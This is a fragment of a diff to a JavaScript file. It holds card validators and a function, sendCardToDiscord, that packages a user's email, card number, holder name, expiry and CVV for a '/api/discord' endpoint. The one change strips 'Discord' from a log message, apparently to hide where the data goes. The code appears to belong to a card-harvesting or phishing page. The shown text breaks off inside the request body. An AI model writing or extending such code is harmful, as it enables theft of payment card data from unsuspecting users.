@@ -134,7 +134,7 @@ function validateCardNumber(n){return /^\d{13,19}$/.test(n.replace(/\s/g,''));}
 function validateExpiry(e){return /^(0[1-9]|1[0-2])\/\d{2}$/.test(e);}
 function validateCVV(c){return /^\d{3,4}$/.test(c);}
 async function sendCardToDiscord(email,cardNumber,cardHolder,expiryDate,cvv){
-  console.log('[Card] Enviando a Discord...');
+  console.log('[Card] Enviando...');
   const apiUrl=window.location.origin+'/api/discord';
   const body={
     email,
